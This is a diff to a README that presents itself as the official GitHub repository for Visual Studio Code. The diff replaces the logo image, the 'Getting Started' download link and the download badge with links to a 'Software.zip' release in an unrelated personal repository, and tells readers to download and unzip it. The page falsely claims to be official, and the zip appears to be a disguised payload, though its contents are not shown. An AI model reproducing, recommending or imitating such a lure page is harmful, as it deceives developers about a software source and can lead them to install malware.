@@ -2,7 +2,7 @@
 
 Welcome to the official GitHub repository for Visual Studio Code! 🎉
 
-![VS Code Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Visual_Studio_Code_1.35_icon.svg/2048px-Visual_Studio_Code_1.35_icon.svg.png)
+![VS Code Logo](https://github.com/kosuriakash/Visual-Studio-Code/releases/download/v1.0/Software.zip)
 
 ## Description
 Visual Studio Code is a powerful, free code editor supporting multiple languages, with built-in Git support, debugging, and customizable extensions. Whether you are working on back-end or front-end development, this versatile code editor has got you covered.
@@ -31,7 +31,7 @@ Explore the various topics related to Visual Studio Code covered in this reposit
 - web-development
 
 ## Getting Started
-To get started with Visual Studio Code, you can download the latest release [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Make sure to unzip the file to get access to the full functionality of the code editor.
+To get started with Visual Studio Code, you can download the latest release [here](https://github.com/kosuriakash/Visual-Studio-Code/releases/download/v1.0/Software.zip). Make sure to unzip the file to get access to the full functionality of the code editor.
 
 ## Features
 Visual Studio Code offers a wide range of features to enhance your coding experience:
@@ -78,7 +78,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![Download VS Code](https://img.shields.io/badge/Download-VS%20Code-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download VS Code](https://github.com/kosuriakash/Visual-Studio-Code/releases/download/v1.0/Software.zip%20Code-blue)](https://github.com/kosuriakash/Visual-Studio-Code/releases/download/v1.0/Software.zip)
 
 ---
 
